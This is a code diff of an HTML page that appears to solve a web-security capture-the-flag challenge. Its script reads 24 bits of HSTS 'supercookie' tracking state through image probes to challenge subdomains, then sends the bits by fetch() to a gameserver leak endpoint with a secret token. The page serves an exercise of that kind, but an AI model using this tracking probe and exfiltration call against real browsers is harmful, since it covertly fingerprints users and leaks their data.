@@ -1,25 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>HSTS bits</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>HSTS bit dumper</title>
+</head>
 <body>
 <script>
-function leak(data){
-  fetch("https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data="+encodeURIComponent(data));
+/* Provided by the challenge infrastructure */
+function leak(data) {
+  fetch(
+    "https://gameserver.websec.saarland/leak" +
+    "?secret=0ab1191eb8d8453c2663adc4869d040d" +
+    "&data=" + encodeURIComponent(data)
+  );
 }
 
-async function probe(n){
-  return await new Promise(r=>{
-    const img=new Image();
-    img.onload =()=>r(0);            // HTTP worked  -> bit 0
-    img.onerror=()=>r(1);            // upgraded+fail-> bit 1
-    img.src=`http://${n}.tracking.jeopardy.websec.saarland/get?${Math.random()}`;
+/* Probe a single bit: 1 = HTTP load succeeded, 0 = failed (HSTS upgrade) */
+async function probe(n) {
+  return await new Promise(res => {
+    const img = new Image();
+    img.onload  = () => res(1);
+    img.onerror = () => res(0);
+    img.src = `http://${n}.tracking.jeopardy.websec.saarland/get?rand=${Math.random()}`;
   });
 }
 
-(async()=>{
-  const bits=[];
-  for(let i=0;i<24;i++) bits.push(await probe(i));
-  leak(bits.join(""));              // e.g. "11001010..."
+/* Main: gather 24 bits, leak as binary string */
+(async () => {
+  const bits = [];
+  for (let i = 0; i < 24; i++) bits.push(await probe(i));   // bit 0 … 23
+  leak(bits.join(""));   // example: "011010111001010101010111"
 })();
 </script>
 </body>
